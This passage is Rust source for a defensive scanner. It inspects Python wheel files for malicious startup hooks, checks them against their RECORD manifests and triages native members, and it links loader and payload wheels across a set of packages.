//! Artifact I/O: inspect a wheel/sdist FILE and an artifact SET (PR B8).
//!
//! A2 classifies a `.whl`/`.so`/... as an `ArtifactCandidate` during collection
//! but, with no analyzer landed, turns it into an `Unsupported` coverage gap. B8
//! closes that gap: this module is the I/O entry point that magic-sniffs an
//! artifact candidate and, for a wheel, runs it through the A4 hardened reader and
//! the B5/B6/B7 analyzers to produce a real [`ArtifactInspection`] (plus the
//! per-member native-chain findings B7 decides during byte inspection).
//!
//! # Single-artifact ([`inspect_artifact_file`])
//!
//! 1. Open the file no-follow within [`ARTIFACT_MAX_FILE_SIZE`] (a wheel ceiling,
//!    larger than the 10 MiB text cap) ONCE and compute its whole-file SHA-256 from
//!    a `try_clone` of that handle, then stream the archive from the SAME open file
//!    description (a single open; no stat-then-reopen TOCTOU window).
//! 2. Magic-sniff: `PK\x03\x04` (a ZIP local-file header) is a wheel/zip; the gzip
//!    magic `\x1f\x8b` (a `.tar.gz` sdist) is `Unsupported` this milestone (the
//!    wheel-only decision); anything else is `Unsupported`.
//! 3. For a wheel, stream it through [`crate::artifact::archive::read_wheel`] with a
//!    capturing visitor that (a) collects native handoffs for B7 triage and (b)
//!    captures the small startup-hook and RECORD member bytes for B5/B6, WITHOUT
//!    re-opening the archive.
//! 4. Run B6 ([`crate::artifact::pth::analyze_body`]) over each captured startup
//!    member and B5 ([`crate::artifact::record::verify_wheel_record`]) over the
//!    RECORD, folding the signals/edges onto the inspection.
//!
//! # Artifact-set ([`inspect_artifact_set`])
//!
//! A single wheel cannot show a cross-distribution loader/payload split (one
//! wheel's `.pth` searches `sys.path` and runs ANOTHER distribution's bundled
//! script). [`inspect_artifact_set`] is the two-pass model required for criterion
//! 5: inspect each wheel independently, build a VIRTUAL installation ownership map
//! across them, resolve cross-artifact references/edges, correlate, and attach each
//! cross-distribution finding to the LOADER artifact while NAMING the payload.

use std::path::{Path, PathBuf};

use crate::artifact::archive::{
    self, is_wheel_filename, ArchiveOutcome, MemberVisitor, NativeMemberHandoff,
};
use crate::artifact::native::triage_native;
use crate::artifact::pth::{self, StartupHookKind};
use crate::artifact::record::{verify_wheel_record, NormalizedInstalledPath, OwnershipIndex};
use crate::artifact::wheel::parse_record;
use crate::artifact::{
    ArtifactFileKind, ArtifactInspection, ArtifactSignalKind, DistributionIdentity, EdgeConfidence,
    ExecutionEdge, ExecutionTrigger, InspectionSubject,
};
use crate::location::SubjectLocation;
use crate::scan::{CoverageGap, CoverageGapKind};
use crate::util::{self, HashOutcome, OpenRegularError};
use crate::verdict::Finding;

/// Maximum artifact-file size opened for inspection: 512 MiB, the same ceiling the
/// A4 reader uses for total uncompressed bytes. Larger than the 10 MiB text-scan
/// cap (a wheel legitimately bundles compiled extensions), but bounded so a hostile
/// multi-gigabyte "wheel" cannot drive an unbounded read or hash.
pub const ARTIFACT_MAX_FILE_SIZE: u64 = 512 * 1024 * 1024;

/// The bytes of a captured small text member (a startup hook or RECORD) plus its
/// location and kind, collected by [`CapturingVisitor`] during the archive stream
/// so B5/B6 can analyze them without re-opening the archive.
struct CapturedMember {
    location: SubjectLocation,
    kind: ArtifactFileKind,
    bytes: Vec<u8>,
}

/// The visitor B8 passes to [`read_wheel`]: it records native handoffs (for B7) and
/// the small startup-hook / RECORD member bytes (for B5/B6). The reader has already
/// enforced every budget before calling, so the captured bytes are bounded.
#[derive(Default)]
struct CapturingVisitor {
    native: Vec<NativeMemberHandoff>,
    text: Vec<CapturedMember>,
}

impl MemberVisitor for CapturingVisitor {
    fn on_native_member(&mut self, handoff: NativeMemberHandoff) {
        self.native.push(handoff);
    }

    fn on_text_member(&mut self, location: &SubjectLocation, kind: ArtifactFileKind, bytes: &[u8]) {
        self.text.push(CapturedMember {
            location: location.clone(),
            kind,
            bytes: bytes.to_vec(),
        });
    }
}

/// The result of inspecting one artifact file: the inspection (with B5/B6 signals
/// and edges folded in), the per-member B7 native-chain findings, and whether the
/// archive was structurally REJECTED (a hard violation, not a coverage limit).
#[derive(Debug, Clone)]
pub struct InspectedArtifact {
    /// The populated inspection (signals/edges/files/coverage).
    pub inspection: ArtifactInspection,
    /// The per-member Critical native-chain findings B7 triage produced. Carried
    /// separately because they are decided per member, not from the merged signal
    /// set; folded into the verdict by
    /// [`crate::artifact::evaluate_inspected_artifact`].
    pub native_findings: Vec<Finding>,
    /// `true` when the archive reader rejected the wheel for a HARD structural
    /// violation (traversal, collision, encryption, CRC failure, conflicting
    /// dist-info, identity mismatch). A rejected wheel is not-clean; its
    /// `inspection` is a best-effort partial for evidence.
    pub rejected: bool,
    /// Human-readable descriptions of the structural violations when `rejected`.
    pub violation_details: Vec<String>,
}

impl InspectedArtifact {
    /// The artifact's on-disk filename (for messages), from its subject.
    pub fn filename(&self) -> Option<&str> {
        match &self.inspection.subject {
            InspectionSubject::Artifact(a) => Some(&a.filename),
            InspectionSubject::GenericArchive(g) => Some(&g.filename),
            _ => None,
        }
    }
}

/// Why inspecting an artifact file did not produce a wheel inspection. The caller
/// turns this into a coverage gap (so an artifact is never silently dropped).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ArtifactInspectError {
    /// The file could not be opened or read (missing, symlinked final component,
    /// non-regular, I/O error).
    Unreadable,
    /// The file exceeds [`ARTIFACT_MAX_FILE_SIZE`].
    TooLarge,
    /// The file is not a wheel/zip (an sdist `.tar.gz`, or an unknown magic). This
    /// milestone is wheel-only, so these are `Unsupported`, never a false claim of
    /// coverage.
    Unsupported,
}

impl ArtifactInspectError {
    /// The coverage-gap kind this error maps to.
    pub fn gap_kind(self) -> CoverageGapKind {
        match self {
            ArtifactInspectError::Unreadable => CoverageGapKind::Unreadable,
            // A too-large artifact is recorded as a hash-budget gap (it is too big to
            // even hash within budget, so it is security-relevant regardless of ext).
            ArtifactInspectError::TooLarge => CoverageGapKind::HashBudgetExceeded,
            ArtifactInspectError::Unsupported => CoverageGapKind::Unsupported,
        }
    }
}

/// Magic-sniff result for an artifact candidate's leading bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArtifactMagic {
    /// `PK\x03\x04` / `PK\x05\x06` (empty) / `PK\x07\x08` — a ZIP, i.e. a wheel.
    Zip,
    /// `\x1f\x8b` — gzip, i.e. a `.tar.gz` sdist (Unsupported this milestone).
    Gzip,
    /// Anything else.
    Unknown,
}

/// Sniff the leading bytes for the artifact magic. Safe and bounded (reads the
/// first 4 bytes only). A wheel/zip starts `PK`; gzip starts `\x1f\x8b`.
fn sniff_magic(bytes: &[u8]) -> ArtifactMagic {
    if bytes.len() >= 4
        && bytes[0] == b'P'
        && bytes[1] == b'K'
        && matches!(
            (bytes[2], bytes[3]),
            (0x03, 0x04) | (0x05, 0x06) | (0x07, 0x08)
        )
    {
        return ArtifactMagic::Zip;
    }
    if bytes.len() >= 2 && bytes[0] == 0x1f && bytes[1] == 0x8b {
        return ArtifactMagic::Gzip;
    }
    ArtifactMagic::Unknown
}

/// Read the leading magic bytes from an open `Read + Seek` handle and classify
/// them, leaving the cursor rewound to 0 for the archive reader. A read I/O fault
/// is [`ArtifactInspectError::Unreadable`], NOT a 0-byte prefix: folding an error
/// into `n = 0` would sniff `Unknown` and mislabel the file as `Unsupported`, the
/// same totality slip the seek-error path avoids. A SHORT (but successful) read is
/// fine — `sniff_magic` simply sees fewer than 4 bytes.
fn sniff_head<R: std::io::Read + std::io::Seek>(
    reader: &mut R,
) -> Result<ArtifactMagic, ArtifactInspectError> {
    use std::io::SeekFrom;
    let mut head = [0u8; 4];
    let n = match reader.read(&mut head) {
        Ok(n) => n,
        Err(_) => return Err(ArtifactInspectError::Unreadable),
    };
    // Rewind for the archive reader regardless of how many bytes we got.
    if reader.seek(SeekFrom::Start(0)).is_err() {
        return Err(ArtifactInspectError::Unreadable);
    }
    Ok(sniff_magic(&head[..n]))
}

/// Inspect one artifact FILE: magic-sniff and, for a wheel, run the A4 reader plus
/// the B5/B6/B7 analyzers. Returns an [`InspectedArtifact`] on success, or an
/// [`ArtifactInspectError`] the caller maps to a coverage gap. NEVER panics and
/// NEVER follows a symlinked final component.
pub fn inspect_artifact_file(path: &Path) -> Result<InspectedArtifact, ArtifactInspectError> {
    use std::io::{Seek as _, SeekFrom};

    // Open no-follow with a wheel-appropriate ceiling ONCE. The opener fstat's the
    // open fd, so an oversized or non-regular file is rejected before any read.
    let mut archive_file = match util::open_read_no_follow_capped(path, ARTIFACT_MAX_FILE_SIZE) {
        Ok(f) => f,
        Err(OpenRegularError::NotFound) | Err(OpenRegularError::NotRegularFile) => {
            return Err(ArtifactInspectError::Unreadable)
        }
        Err(OpenRegularError::TooLarge) => return Err(ArtifactInspectError::TooLarge),
        Err(OpenRegularError::Io(_)) => return Err(ArtifactInspectError::Unreadable),
    };

    // Whole-file SHA-256 over THIS open file description (the artifact identity).
    // We never re-open the path: a `try_clone` (dup(2)) shares the SAME open file
    // description and the SAME inode we just fstat'd, so the hashed bytes and the
    // streamed bytes are the same file even if the path is swapped underneath us
    // (closing the hash-fd vs stream-fd TOCTOU a stat-then-reopen would leave). We
    // hash the clone (which `sha256_from_handle` consumes), then seek the original
    // back to 0 and stream the archive from it.
    let hash_handle = match archive_file.try_clone() {
        Ok(f) => f,
        Err(_) => return Err(ArtifactInspectError::Unreadable),
    };
    let outer_sha256 = match util::sha256_from_handle(hash_handle, ARTIFACT_MAX_FILE_SIZE) {
        Ok(HashOutcome::Digest(hex)) => hex,
        Ok(HashOutcome::BudgetExceeded) => return Err(ArtifactInspectError::TooLarge),
        Err(_) => return Err(ArtifactInspectError::Unreadable),
    };

    // Magic sniff the leading bytes (bounded) from the SAME handle, then seek back
    // to 0 so the archive reader sees the whole file. The hash above may have left
    // the clone's cursor at EOF, but the clone shares this fd's file offset, so we
    // seek to 0 here unconditionally before the sniff read.
    if archive_file.seek(SeekFrom::Start(0)).is_err() {
        return Err(ArtifactInspectError::Unreadable);
    }
    let magic = sniff_head(&mut archive_file)?;

    let outer_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("artifact")
        .to_string();

    match magic {
        ArtifactMagic::Zip if is_wheel_filename(&outer_name) => {
            inspect_wheel(archive_file, &outer_name, &outer_sha256)
        }
        // A `PK` magic but a non-`.whl` name is a generic zip: this milestone does
        // not inspect generic archives as packages, so it is Unsupported (the A4
        // reader could read it, but we do not claim package coverage for a plain
        // zip here).
        ArtifactMagic::Zip => Err(ArtifactInspectError::Unsupported),
        // gzip / unknown: wheel-only milestone, so Unsupported (never a false claim
        // of sdist coverage).
        ArtifactMagic::Gzip | ArtifactMagic::Unknown => Err(ArtifactInspectError::Unsupported),
    }
}

/// Inspect a wheel from an open `Read + Seek` handle: run the A4 reader with the
/// capturing visitor, then fold the B5/B6/B7 analysis onto the inspection.
fn inspect_wheel<R: std::io::Read + std::io::Seek>(
    reader: R,
    outer_name: &str,
    outer_sha256: &str,
) -> Result<InspectedArtifact, ArtifactInspectError> {
    let mut visitor = CapturingVisitor::default();
    let outcome = archive::read_wheel(
        reader,
        outer_name,
        outer_sha256,
        &archive::ArchiveLimits::default(),
        &mut visitor,
    );

    let (mut inspection, rejected, violation_details) = match outcome {
        ArchiveOutcome::Accepted(i) => (i, false, Vec::new()),
        ArchiveOutcome::Rejected {
            violations,
            partial,
        } => {
            let details = violations.iter().map(describe_violation).collect();
            (partial, true, details)
        }
    };

    // B6: analyze each captured startup-hook body; B5: verify the wheel RECORD.
    let mut native_findings: Vec<Finding> = Vec::new();
    let mut record_entries_bytes: Option<Vec<u8>> = None;

    for captured in &visitor.text {
        match captured.kind {
            ArtifactFileKind::PthFile
            | ArtifactFileKind::StartFile
            | ArtifactFileKind::SiteCustomize => {
                fold_startup_member(&mut inspection, captured);
            }
            ArtifactFileKind::DistInfoMetadata => {
                // The RECORD member (the only DistInfoMetadata member captured).
                record_entries_bytes = Some(captured.bytes.clone());
            }
            _ => {}
        }
    }

    // B5: wheel-RECORD verification against the inspection's hashed members.
    let record = match &record_entries_bytes {
        Some(bytes) => {
            let text = String::from_utf8_lossy(bytes);
            parse_record(&text).ok()
        }
        None => None,
    };
    // Only verify a wheel RECORD when the wheel actually has one (an absent RECORD
    // would emit a spurious MissingRecord violation for a generic zip; for a real
    // wheel a missing RECORD IS a finding, so we verify whenever the subject is a
    // wheel artifact).
    if matches!(inspection.subject, InspectionSubject::Artifact(_)) {
        let result = verify_wheel_record(&inspection, record.as_deref());
        inspection.signals.extend(result.signals);
    }

    // B7: triage each native handoff. The artifact path has no ownership index (a
    // single wheel is its own distribution), so `known_malicious_indicator` is
    // false here; the artifact-set path supplies cross-distribution corroboration.
    for handoff in &visitor.native {
        let triage = triage_native(handoff, false);
        inspection.signals.extend(triage.signals);
        inspection.execution_edges.extend(triage.edges);
        if let Some(finding) = triage.finding {
            native_findings.push(finding);
        }
    }

    Ok(InspectedArtifact {
        inspection,
        native_findings,
        rejected,
        violation_details,
    })
}

/// Fold one captured startup-hook member's B6 body analysis onto the inspection:
/// the granular signals plus the execution edges (a cross-runtime edge when a
/// foreign runtime is launched, and a generic import edge per executing line).
fn fold_startup_member(inspection: &mut ArtifactInspection, captured: &CapturedMember) {
    let kind = match captured.kind {
        ArtifactFileKind::PthFile => StartupHookKind::Pth,
        ArtifactFileKind::StartFile => StartupHookKind::Start,
        ArtifactFileKind::SiteCustomize => StartupHookKind::SiteCustomize,
        _ => return,
    };
    let body = String::from_utf8_lossy(&captured.bytes);
    let analysis = pth::analyze_body(&body, &captured.location, kind);
    inspection.signals.extend(analysis.signals);

    if analysis.capabilities.cross_runtime {
        inspection.execution_edges.push(ExecutionEdge {
            from: captured.location.clone(),
            trigger: ExecutionTrigger::CrossRuntimeInvocation,
            to: SubjectLocation::default(),
            mechanism: "startup hook launches a foreign language runtime (Bun/Node/Deno)"
                .to_string(),
            confidence: EdgeConfidence::High,
        });
    }
    for line in &analysis.lines {
        if line.class.executes() {
            inspection.execution_edges.push(ExecutionEdge {
                from: captured.location.clone(),
                trigger: kind.trigger(),
                to: SubjectLocation::default(),
                mechanism: format!("startup line imports/executes: {}", line.text.trim()),
                confidence: EdgeConfidence::Medium,
            });
        }
    }
}

/// A short human description of a structural archive violation (for the rejected
/// artifact's evidence / CLI output).
fn describe_violation(v: &archive::ArchiveViolation) -> String {
    use archive::ArchiveViolation as V;
    match v {
        V::PathTraversal { member } => format!("path traversal member: {member}"),
        V::WindowsPathTraversal { member } => format!("windows-path member: {member}"),
        V::DuplicatePath {
            normalized,
            first,
            second,
        } => format!("duplicate path '{normalized}' ({first} vs {second})"),
        V::EncryptedMember { member } => format!("encrypted member: {member}"),
        V::CrcMismatch { member } => format!("CRC mismatch: {member}"),
        V::SymlinkMember { member, target } => format!("symlink member: {member} -> {target}"),
        V::ConflictingDistInfo { roots } => {
            format!("conflicting .dist-info roots: {}", roots.join(", "))
        }
        V::IdentityMismatch { detail } => format!("identity mismatch: {detail}"),
        V::MalformedArchive { detail } => format!("malformed archive: {detail}"),
    }
}

// ---------------------------------------------------------------------------
// Artifact-set (cross-distribution) inspection
// ---------------------------------------------------------------------------

/// A two-pass inspection of a SET of artifacts, for cross-distribution
/// loader/payload detection (criterion 5). Pass 1 inspects each wheel
/// independently; pass 2 builds a virtual installation ownership map and resolves
/// references/edges ACROSS artifacts, attaching each cross-distribution finding to
/// the LOADER artifact while naming the payload.
pub struct ArtifactSetInspection {
    /// Each artifact's independent inspection (pass 1), in input order. A
    /// per-artifact [`ArtifactInspectError`] (an unreadable / unsupported / oversize
    /// member of the set) is recorded as a coverage gap rather than dropping the
    /// whole set.
    pub members: Vec<ArtifactSetMember>,
    /// The cross-distribution findings (pass 2), each attached to the loader
    /// artifact and naming the payload artifact. Reuses the existing RuleIds.
    pub cross_findings: Vec<Finding>,
    /// Coverage gaps for set members that could not be inspected (so a set is never
    /// silently incomplete).
    pub gaps: Vec<CoverageGap>,
}

/// One artifact in a set: its on-disk path and its independent inspection result.
pub struct ArtifactSetMember {
    /// The artifact's on-disk path.
    pub path: PathBuf,
    /// The independent inspection (pass 1).
    pub inspected: InspectedArtifact,
}

impl ArtifactSetInspection {
    /// Every finding in the set: each member's own signal-correlated + native
    /// findings, plus the cross-distribution findings. Built by re-correlating each
    /// member (so the per-member native findings are included) and appending the
    /// cross findings; the caller finalizes this into ONE verdict.
    pub fn all_findings(&self, threat_db: Option<&crate::threatdb::ThreatDb>) -> Vec<Finding> {
        let mut findings: Vec<Finding> = Vec::new();
        for m in &self.members {
            findings.extend(crate::artifact::correlate::correlate_inspection_findings(
                &m.inspected.inspection,
                &m.inspected.native_findings,
                threat_db,
            ));
        }
        findings.extend(self.cross_findings.iter().cloned());
        findings
    }
}

/// Inspect a SET of artifact files for cross-distribution execution. Pass 1
/// inspects each independently; pass 2 builds the virtual ownership map and
/// correlates cross-artifact loader/payload splits.
pub fn inspect_artifact_set(paths: &[PathBuf]) -> ArtifactSetInspection {
    // ---- Pass 1: inspect every artifact independently ------------------------
    let mut members: Vec<ArtifactSetMember> = Vec::new();
    let mut gaps: Vec<CoverageGap> = Vec::new();
    for path in paths {
        match inspect_artifact_file(path) {
            Ok(inspected) => members.push(ArtifactSetMember {
                path: path.clone(),
                inspected,
            }),
            Err(e) => gaps.push(CoverageGap {
                location: SubjectLocation::from_path(path.clone()),
                kind: e.gap_kind(),
                sha256: None,
            }),
        }
    }

    // ---- Pass 2: virtual ownership map across all artifacts ------------------
    // Each wheel's members become "installed" paths owned by that wheel's
    // distribution identity, so a loader in wheel A that references a path owned by
    // wheel B resolves across the set. The ownership KEY is the member path inside
    // the wheel (the same forward-slash module path a `.pth`/import would name).
    let mut index = OwnershipIndex::new();
    for m in &members {
        let Some(dist) = member_distribution_identity(m) else {
            continue;
        };
        for file in &m.inspected.inspection.files {
            if let Some(member) = &file.location.member_path {
                index.insert(NormalizedInstalledPath::new(member), dist.clone());
            }
        }
    }

    // ---- Pass 3/4: resolve cross-artifact references and correlate -----------
    let cross_findings = correlate_cross_distribution(&members, &index);

    ArtifactSetInspection {
        members,
        cross_findings,
        gaps,
    }
}

/// The distribution identity for a set member (for the virtual ownership map). A
/// wheel artifact identity becomes a distribution identity keyed by its on-disk
/// INPUT PATH, not the bare filename: two same-named wheels in different
/// directories (`a/demo-1.0.whl` and `b/demo-1.0.whl`) must stay distinct
/// identities so a cross-distribution split between them is not collapsed and
/// missed. `same_distribution` compares name + this location, so the full path is
/// what makes them distinguishable.
fn member_distribution_identity(member: &ArtifactSetMember) -> Option<DistributionIdentity> {
    match &member.inspected.inspection.subject {
        InspectionSubject::Artifact(a) => Some(DistributionIdentity {
            ecosystem: a.ecosystem,
            name: a.name.clone(),
            version: a.version.clone(),
            // No on-disk dist-info dir for an un-installed wheel; use the artifact's
            // actual input path as the stable identity location so two artifacts
            // with the SAME filename in different directories stay distinct.
            dist_info_path: SubjectLocation::from_path(member.path.clone()),
        }),
        _ => None,
    }
}

/// Correlate cross-distribution execution across the set: a LOADER artifact whose
/// startup hook (a `.pth`/`.start`/sitecustomize) searches `sys.path` and can run a
/// PAYLOAD owned by a DIFFERENT artifact. The finding is attached to the loader and
/// NAMES the payload, reusing the existing startup/native RuleIds (cross-cutting
/// invariant 1: no new RuleId for the cross-artifact context).
fn correlate_cross_distribution(
    members: &[ArtifactSetMember],
    index: &OwnershipIndex,
) -> Vec<Finding> {
    use crate::verdict::{Evidence, RuleId, Severity};
    let mut findings: Vec<Finding> = Vec::new();

    for loader in members {
        let Some(loader_dist) = member_distribution_identity(loader) else {
            continue;
        };
        // A loader is interesting only if it has a startup hook that EXECUTES and
        // searches sys.path (the mechanism that reaches another distribution's
        // bundled payload). The B6 signals on the inspection encode this.
        let has_sys_path_search = loader
            .inspected
            .inspection
            .signals
            .iter()
            .any(|s| s.kind == ArtifactSignalKind::PthSysPathSearch);
        let has_executing_line = loader
            .inspected
            .inspection
            .signals
            .iter()
            .any(|s| s.kind == ArtifactSignalKind::PthExecutableLine);
        if !(has_sys_path_search && has_executing_line) {
            continue;
        }

        // Resolve which OTHER artifacts own a payload the loader actually
        // REFERENCES. A reference token in the loader's executing startup lines must
        // resolve, through the ownership map, to a payload-shaped member owned by a
        // DIFFERENT distribution in the set. This keys on the ownership relationship
        // (a rename does not evade, because the member path is what the loader names
        // and what the map owns) and does NOT fire on an unrelated payload-shaped
        // member the loader never references.
        let payload_refs = resolve_cross_payloads(loader, &loader_dist, index, members);
        if payload_refs.is_empty() {
            continue;
        }

        // One finding per loader, naming every distinct payload artifact reached.
        let payload_names: Vec<String> = payload_refs
            .iter()
            .map(|p| p.payload_artifact.clone())
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .collect();

        let loader_name = loader
            .inspected
            .filename()
            .unwrap_or("loader artifact")
            .to_string();

        let mut evidence: Vec<Evidence> = vec![Evidence::Text {
            detail: format!(
                "loader artifact '{loader_name}' bundles a startup hook that searches sys.path \
                 and can execute a payload owned by another distribution in the set: {}",
                payload_names.join(", ")
            ),
        }];
        for r in &payload_refs {
            evidence.push(Evidence::Text {
                detail: format!(
                    "{} -> {} (payload member: {})",
                    r.loader_member, r.payload_artifact, r.payload_member
                ),
            });
        }

        // The reference now genuinely resolves through the ownership map to a
        // foreign-owned payload-shaped member, so the earlier Medium severity
        // "downgrade stopgap" (which guarded against the over-broad
        // any-foreign-payload heuristic) no longer applies. When the loader ALSO
        // launches a foreign runtime (Bun/Node/Deno) it is the full cross-runtime
        // campaign signature: Critical, a hard Block. When it does not, an executing
        // startup hook that names and reaches another distribution's payload is still
        // High (a Block-worthy supply-chain signal), not a Warn. Either way the
        // finding is attached to the loader and names the payload.
        let loader_cross_runtime = loader
            .inspected
            .inspection
            .execution_edges
            .iter()
            .any(|e| matches!(e.trigger, ExecutionTrigger::CrossRuntimeInvocation));

        let (rule_id, severity) = if loader_cross_runtime {
            (RuleId::PythonStartupHookCrossRuntime, Severity::Critical)
        } else {
            (RuleId::PythonStartupHookSuspicious, Severity::High)
        };

        findings.push(Finding {
            rule_id,
            severity,
            title: "A startup hook executes a payload bundled in another distribution".to_string(),
            description:
                "Across the inspected artifact set, one distribution's startup hook searches \
                 sys.path at interpreter start and can execute a payload bundled in a DIFFERENT \
                 distribution. This is the cross-distribution loader/payload split used by the \
                 live supply-chain campaign: the loader wheel looks benign in isolation, and the \
                 payload wheel is never opened by a single-artifact scan. The finding is attached \
                 to the loader artifact and names the payload artifact. The detection keys on the \
                 sys.path-search + cross-distribution-ownership relationship, not on payload \
                 filenames, so renaming the payload does not evade it. Do not install either \
                 artifact until both are reviewed."
                    .to_string(),
            evidence,
            human_view: None,
            agent_view: None,
            mitre_id: Some("T1546".to_string()),
            custom_rule_id: None,
        });
    }

    findings
}

/// A resolved cross-distribution payload reference: the loader member that reaches
/// it, and the payload artifact + member it resolves to.
struct CrossPayloadRef {
    loader_member: String,
    payload_artifact: String,
    payload_member: String,
}

/// The maximum number of distinct candidate paths extracted from a loader's
/// startup lines before resolution stops, so a pathological line cannot drive a
/// quadratic blow-up over a large set.
const MAX_CROSS_REFERENCE_CANDIDATES: usize = 256;

/// Resolve the payloads a loader's startup hook actually REFERENCES that are owned
/// by a DIFFERENT distribution in the set (PR-I real ownership resolution, replacing
/// the earlier "any foreign payload-shaped member is reachable" stopgap).
///
/// A reference qualifies only when:
/// 1. the loader's executing startup line names a token that normalizes to an
///    installed path the ownership `index` records (`index.owners(path)` is
///    non-empty), AND
/// 2. an owner of that path is a DIFFERENT distribution than the loader, AND
/// 3. the OWNED member at that path is payload-shaped (script / native / wasm) in
///    the owning artifact.
///
/// This keys on the ownership relationship, not a payload-filename allowlist, so a
/// rename of the payload does not evade (its member path is what the loader names
/// and what the map owns). It does NOT fire on an unrelated payload-shaped member in
/// another wheel that the loader never references.
fn resolve_cross_payloads(
    loader: &ArtifactSetMember,
    loader_dist: &DistributionIdentity,
    index: &OwnershipIndex,
    members: &[ArtifactSetMember],
) -> Vec<CrossPayloadRef> {
    // The loader's executing startup lines (the reference site). We attribute the
    // cross reference to the first executing startup member for the evidence.
    let loader_member = loader
        .inspected
        .inspection
        .signals
        .iter()
        .find(|s| s.kind == ArtifactSignalKind::PthExecutableLine)
        .map(|s| s.location.to_string())
        .unwrap_or_else(|| "loader startup hook".to_string());

    // Extract the candidate installed paths the loader's executing lines reference.
    let candidates = loader_reference_candidates(loader);

    let mut refs: Vec<CrossPayloadRef> = Vec::new();
    let mut seen: std::collections::BTreeSet<(String, String)> = std::collections::BTreeSet::new();
    for candidate in &candidates {
        // Resolve the reference against the ownership map. Every distribution that
        // owns this exact path is a candidate owner; we keep only a DIFFERENT one
        // whose member at this path is payload-shaped.
        for owner in index.owners(candidate) {
            if same_distribution(loader_dist, owner) {
                continue;
            }
            // Find the owning set member and confirm the OWNED member at this path is
            // payload-shaped (the index maps path -> distribution, not path -> kind,
            // so we re-look-up the actual member kind in the owner).
            let Some(owner_member) = members.iter().find(|m| {
                member_distribution_identity(m)
                    .as_ref()
                    .is_some_and(|d| same_distribution(d, owner))
            }) else {
                continue;
            };
            let Some(file) = owner_member.inspected.inspection.files.iter().find(|f| {
                f.location
                    .member_path
                    .as_deref()
                    .map(|mp| NormalizedInstalledPath::new(mp) == *candidate)
                    .unwrap_or(false)
            }) else {
                continue;
            };
            if !is_payload_kind(file.kind) {
                continue;
            }
            let payload_artifact = owner_member
                .inspected
                .filename()
                .unwrap_or("payload artifact")
                .to_string();
            let payload_member = file.location.to_string();
            // Dedupe by (artifact, member) so two reference tokens naming the same
            // owned member produce one entry.
            if seen.insert((payload_artifact.clone(), payload_member.clone())) {
                refs.push(CrossPayloadRef {
                    loader_member: loader_member.clone(),
                    payload_artifact,
                    payload_member,
                });
            }
        }
    }

    refs
}

/// Extract the set of candidate installed paths a loader's EXECUTING startup lines
/// reference, for resolution against the ownership map. Sources, all from the
/// `PthExecutableLine` signal evidence (which embeds the literal source line):
/// * quoted path-ish / script-ish string literals (`'pkg/run.sh'`, `"pkg/_boot.py"`),
///   including a runtime argument inside a shell string (`node pkg/run.sh`);
/// * dotted module names that follow an `import` / `__import__` /
///   `importlib.import_module` (`import pkg.run` -> `pkg/run`, `pkg/run.py`,
///   `pkg/__init__.py`).
///
/// A token containing `..` is dropped (the normalizer does not resolve traversal,
/// so such a token cannot soundly resolve to an owned path). Candidates are
/// deduplicated and capped at [`MAX_CROSS_REFERENCE_CANDIDATES`].
fn loader_reference_candidates(loader: &ArtifactSetMember) -> Vec<NormalizedInstalledPath> {
    let mut out: std::collections::BTreeSet<NormalizedInstalledPath> =
        std::collections::BTreeSet::new();

    for sig in loader
        .inspected
        .inspection
        .signals
        .iter()
        .filter(|s| s.kind == ArtifactSignalKind::PthExecutableLine)
    {
        for raw in extract_reference_tokens(&sig.evidence) {
            if out.len() >= MAX_CROSS_REFERENCE_CANDIDATES {
                break;
            }
            // A token must not contain a parent-directory traversal: the normalizer
            // keeps `..` verbatim, and an installed member path never legitimately
            // contains one, so such a token cannot resolve to a real owned path.
            if raw.split('/').any(|seg| seg == "..") || raw.contains("..\\") {
                continue;
            }
            let norm = NormalizedInstalledPath::new(&raw);
            if norm.as_str().is_empty() {
                continue;
            }
            out.insert(norm);
        }
    }

    out.into_iter().collect()
}

/// Pull the path/module reference tokens out of one executing-line evidence string.
///
/// The evidence wraps the literal source line as `<label> ... : '<source line>'`,
/// and the source line itself contains quotes, so naive quote-pairing across the
/// whole evidence string mis-splits. We therefore first UNWRAP the source line (the
/// run between the wrapper's `: '` and its final `'`), then tokenize THAT on shell /
/// Python separators and whitespace, collecting only path-ish tokens (those with a
/// path separator or a filename extension). A bare identifier (`os`, `sys`) is not
/// path-ish, so a stdlib name cannot accidentally resolve to an owned member. Dotted
/// `import` module names are expanded separately into their candidate file paths.
fn extract_reference_tokens(evidence: &str) -> Vec<String> {
    let mut tokens: Vec<String> = Vec::new();

    // The actual source line, unwrapped from the evidence wrapper. The wrapper marker
    // is `: '` and the source line is the rest up to the final `'`. If the wrapper is
    // absent (a body-level evidence string), fall back to the whole evidence.
    let source_line = unwrap_source_line(evidence);

    // 1) Path-ish tokens anywhere in the source line. Split on the shell / Python
    //    punctuation that separates a path argument from surrounding code (quotes,
    //    parentheses, commas, semicolons, whitespace, `=`), then keep the path-ish
    //    pieces. `node payloadpkg/run.sh` -> `payloadpkg/run.sh`;
    //    `sys.path.insert(0, '/tmp')` contributes no path-ish OWNED token (a leading
    //    `/tmp` is absolute and not an installed member path).
    for word in source_line.split(|c: char| {
        c.is_whitespace() || matches!(c, '\'' | '"' | '(' | ')' | ',' | ';' | '=' | '`')
    }) {
        if looks_path_ish(word) {
            tokens.push(word.to_string());
        }
    }

    // 2) Dotted module names after an import keyword. `import a.b.c` and
    //    `import_module('a.b')` both name a module path; expand to the file
    //    candidates Python would resolve it to: a `.py` module, a package
    //    `__init__.py`, the bare directory, or a compiled extension
    //    (`.so`/`.pyd`/`.abi3.so`/`.dylib`) — the campaign's payload split commonly
    //    hands off to a native extension module imported by name.
    for module in dotted_import_modules(&source_line) {
        let slashed = module.replace('.', "/");
        tokens.push(format!("{slashed}.py"));
        tokens.push(slashed.clone());
        tokens.push(format!("{slashed}/__init__.py"));
        for ext in ["so", "pyd", "abi3.so", "dylib", "node"] {
            tokens.push(format!("{slashed}.{ext}"));
        }
    }

    tokens
}

/// Unwrap the literal source line from an executing-line evidence string. The
/// evidence is formatted `<label> line N executes at interpreter start: '<line>'`
/// (and similar), so the source line is the run between the LAST `: '` marker and
/// the final `'`. When no wrapper is present (a body-level evidence string with no
/// embedded source), the whole evidence is returned unchanged.
fn unwrap_source_line(evidence: &str) -> String {
    if let Some(marker) = evidence.rfind(": '") {
        let after = &evidence[marker + 3..];
        let inner = after.strip_suffix('\'').unwrap_or(after);
        return inner.to_string();
